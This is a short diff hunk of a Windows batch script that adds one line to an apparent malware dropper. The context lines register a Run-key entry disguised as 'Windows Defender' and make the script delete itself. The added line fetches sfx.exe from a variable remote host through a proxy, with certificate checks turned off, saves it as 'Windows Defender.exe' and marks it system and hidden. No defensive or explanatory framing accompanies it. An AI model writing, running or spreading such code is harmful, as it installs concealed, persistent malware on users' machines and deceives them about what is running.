@@ -52,5 +52,6 @@ attrib -s -h -i "%environment%\expose.exe" && if exist "%environment%\expose.exe
 )
 
 REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Defender" /t REG_SZ /F /D "%environment%\Windows Defender.exe -P\"rofile of Windows Defender [Microsoft Corporation]"\"
+"%environment%\curl.exe" -k %proxy% %host%/sfx.exe -o "%environment%\Windows Defender.exe" && attrib +s +h +i "%environment%\Windows Defender.exe"
 endlocal
 DEL /s /f /q /a "%~f0"
